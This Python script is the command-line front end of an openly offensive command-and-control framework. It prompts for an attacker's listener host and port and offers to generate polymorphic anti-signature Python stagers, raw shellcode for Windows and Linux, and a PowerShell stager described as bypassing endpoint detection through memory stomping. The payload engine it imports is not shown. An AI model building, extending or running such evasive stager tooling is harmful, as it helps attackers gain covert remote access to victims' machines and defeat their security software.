import os
import sys
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.syntax import Syntax
from core.generator import ElitePayloadEngine
BANNER = """
 [bold red] ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ██████╗ ██████╗ ██████╗ ███████╗[/bold red]
 [bold red]██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝     ██╔══██╗██╔══██╗██╔══██╗██╔════╝[/bold red]
 [bold white]██║  ███╗███████║██║   ██║███████╗   ██║        ██████╔╝██████╔╝██████╔╝███████╗[/bold white]
 [bold white]██║   ██║██╔══██║██║   ██║╚════██║   ██║        ██╔═══╝ ██╔═══╝ ██╔═══╝ ╚════██║[/bold white]
 [bold blue]╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██╗  ██║     ██║     ██║     ███████║[/bold blue]
 [bold blue] ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═╝     ╚══════╝[/bold blue]
 [bold yellow]         Elite C2 & Polymorphic Red Ops Framework (Exceeds Sliver)[/bold yellow]
 [italic cyan]                               Ghost-SY1 Security 2026[/italic cyan]
"""
console = Console()
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def main():
    clear_screen()
    console.print(Panel(BANNER, border_style="bold red", expand=False))
    lhost = Prompt.ask("[bold yellow]Enter C2 Listener LHOST[/bold yellow]")
    lport = int(Prompt.ask("[bold yellow]Enter C2 Listener LPORT[/bold yellow]"))
    console.print("[bold cyan][1][/bold cyan] Polymorphic Python Stager (Junk Code & Anti-Signature)")
    console.print("[bold cyan][2][/bold cyan] Raw Shellcode Generator Command (Windows x64 / x86 / Linux)")
    console.print("[bold cyan][3][/bold cyan] EDR Bypass PowerShell Stager (Memory Stomping)")
    choice = Prompt.ask("[bold yellow]Select C2 Operation Mode[/bold yellow]", choices=["1", "2", "3"])
    engine = ElitePayloadEngine(lhost, lport)
    if choice == "1":
        payload = engine.generate_polymorphic_python()
        syntax = Syntax(payload, "python", theme="monokai", line_numbers=True)
        console.print(Panel(syntax, title="Polymorphic Python Payload", border_style="bold green"))
    elif choice == "2":
        arch = Prompt.ask("[bold yellow]Target Architecture[/bold yellow]", choices=["x64", "x86", "linux"], default="x64")
        cmd = engine.generate_raw_shellcode_command(arch)
        c_array = engine.generate_c_array_shellcode(arch)
        console.print(Panel(f"[bold red]Raw Shellcode Command:[/bold red]\n{cmd}", border_style="red"))
        console.print(Panel(f"[bold yellow]C-Array Generation Recipe:[/bold yellow]\n{c_array}", border_style="yellow"))
    elif choice == "3":
        stager = engine.generate_edr_bypass_stager()
        syntax = Syntax(stager, "powershell", theme="monokai", line_numbers=False)
        console.print(Panel(syntax, title="EDR Bypass PowerShell Stager", border_style="bold green"))
if __name__ == "__main__":
    main()
